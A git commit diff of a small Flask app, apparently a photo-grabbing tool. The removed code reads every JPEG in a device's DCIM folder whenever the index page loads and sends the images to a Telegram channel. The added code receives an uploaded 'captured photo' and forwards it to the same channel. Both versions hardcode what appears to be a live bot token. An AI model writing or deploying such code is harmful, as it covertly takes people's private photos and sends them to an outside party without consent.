ed3116a2aec82dd228aaecbec1bf6f5a7dcebd6c
Gomaa <137703660+mhfng@users.noreply.github.com>
2023-06-25 23:31:32 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,22 +1,29 @@
-from flask import Flask, render_template
-import glob
-import telebot
+from flask import Flask, render_template, request
+import requests
 
 app = Flask(__name__)
 
+# Route for the index page
 @app.route('/')
 def index():
-    send_images_to_telegram()
     return render_template('index.html')
 
-def send_images_to_telegram():
-    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
-    bot = telebot.TeleBot(bot_token)
-    image_paths = glob.glob('/sdcards/DCIM/*.jpg')
+# Route to receive the photo and send it to the Telegram channel
+@app.route('/upload', methods=['POST'])
+def upload():
+    photo = request.files['photo']
+    photo.save('captured_photo.jpg')  # Save the photo to a file
 
-    for image_path in image_paths:
-        with open(image_path, 'rb') as file:
-            bot.send_photo(chat_id='@localipy', photo=file)
+    # Send the photo to the Telegram channel using the Telegram Bot API
+    telegram_bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
+    telegram_channel_id = '@localipy'
+
+    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendPhoto'
+    data = {'chat_id': telegram_channel_id}
+    files = {'photo': open('captured_photo.jpg', 'rb')}
+    response = requests.post(url, data=data, files=files)
+
+    return 'Photo sent to Telegram channel'
 
 if __name__ == '__main__':
     app.run()
